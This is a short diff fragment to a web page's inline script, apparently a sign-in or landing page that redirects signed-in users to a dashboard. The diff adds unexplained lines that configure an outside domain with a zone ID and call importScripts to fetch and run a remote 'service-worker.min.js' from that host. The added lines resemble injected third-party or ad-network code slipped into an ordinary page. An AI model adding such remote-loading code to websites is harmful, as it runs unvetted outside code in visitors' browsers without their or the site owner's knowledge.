@@ -129,6 +129,12 @@ document.getElementById("intro")?.addEventListener("animationend", (e) => {
 
 // Already signed in? Skip straight to the dashboard.
 getSession().then((s) => { if (s) location.href = "dashboard.html"; });
+  self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11914550
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
 </script>
 </body>
 </html>
